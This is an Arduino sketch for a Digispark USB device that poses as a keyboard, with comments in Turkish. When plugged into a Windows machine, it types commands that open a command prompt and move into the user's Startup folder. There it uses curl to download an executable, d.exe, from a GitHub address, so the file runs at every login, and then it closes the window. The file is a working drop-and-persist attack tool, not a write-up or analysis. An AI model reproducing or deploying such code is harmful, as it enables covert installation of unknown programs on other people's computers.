#include "DigiKeyboard.h"
#define kbd_tr_tr


void setup() {
  // 500 milisaniye bekleyelim, bilgisayarın bağlantı kurmasını bekleyelim
  delay(500);
}

void loop() {
  // "Win + R" tuş kombinasyonunu taklit et
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  // Biraz bekleyelim
  delay(500);

  // "notepad" komutunu yazıp Enter tuşuna bas
  DigiKeyboard.println("cmd");

  // Bekleme süresi
  delay(1000); 
  DigiKeyboard.println("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
  delay(1000); 
  DigiKeyboard.println("curl -LJO https://github.com/dotesec/d/raw/main/d.exe");
  delay(9000); 
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  delay(6000000000000000); 
}
